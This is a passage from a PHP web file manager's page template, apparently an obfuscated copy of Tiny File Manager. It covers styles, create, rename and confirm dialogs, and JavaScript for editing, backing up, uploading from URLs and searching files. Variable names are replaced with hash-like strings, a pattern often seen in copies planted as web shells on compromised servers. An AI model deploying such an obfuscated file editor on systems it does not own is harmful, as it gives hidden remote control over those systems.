        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
        input#preview-img-zoomCheck[type=checkbox] { display:none }
        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php
    if (FM_THEME == "dark"): ?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #CFD8DC !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php endif; ?>
</head>
<body class="<?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php echo $v99f77a28; ?>">
<div id="wrapper" class="container-fluid">
    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo fm_get_theme(); ?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo lng('CreateNewItem') ?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php echo lng('ItemType') ?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php echo lng('File') ?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php echo lng('Folder') ?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php echo lng('ItemName') ?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo lng('Enter here...') ?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('CreateNow') ?></button>
                </div>
            </form>
        </div>
    </div>

    <!-- Advance Search Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php echo fm_get_theme(); ?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?> <?php echo lng('a files') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php echo lng('Search file in folder and subfolders...') ?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--Rename Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo lng('Are you sure want to rename?') ?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo lng('Enter new file name') ?>" required>
                <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo lng('Okay') ?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <!-- Confirm Modal -->
    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
                <input type="hidden" name="token" value="<?php echo $vbc4af197['token']; ?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo lng('Okay') ?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php
    }

    /**
     * Show page footer after login
     */
    function fm_show_footer()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
<?php print_external('js-jquery-datatables'); ?>
<?php if (FM_USE_HIGHLIGHTJS && isset($v51e4dd52['view'])): ?>
    <?php print_external('js-highlightjs'); ?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php endif; ?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) { // Create file backup with .bck
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    // Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' && n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    // Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    // Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    // Advance search
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt && searchTxt.length > 2 && path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data && data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    // action confirm dailog modal
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    // on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);

    // Dom Ready Events
    $(document).ready( function () {
        // dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        // filter table
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php if (isset($v51e4dd52['edit']) && isset($v51e4dd52['env']) && FM_EDIT_FILE && !FM_READONLY):
        
        $v00b4247d = pathinfo($v51e4dd52["edit"], PATHINFO_EXTENSION);
        $v00b4247d =  $v00b4247d == "js" ? "javascript" :  $v00b4247d;
        ?>
    <?php print_external('js-ace'); ?>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php echo $v00b4247d; ?>", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        editor.setShowPrintMargin(false); // Hide the vertical ruler
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change(); //set default font size in drop down
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
